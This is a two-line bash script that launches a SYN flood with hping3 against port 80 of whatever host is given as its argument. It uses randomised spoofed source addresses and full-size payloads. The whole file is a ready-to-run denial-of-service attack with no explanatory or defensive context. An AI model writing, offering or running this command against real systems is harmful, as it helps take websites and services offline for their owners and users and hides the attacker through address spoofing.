#!/bin/bash
hping3 --flood --rand-source -d 1460 -p 80 -S "$1"
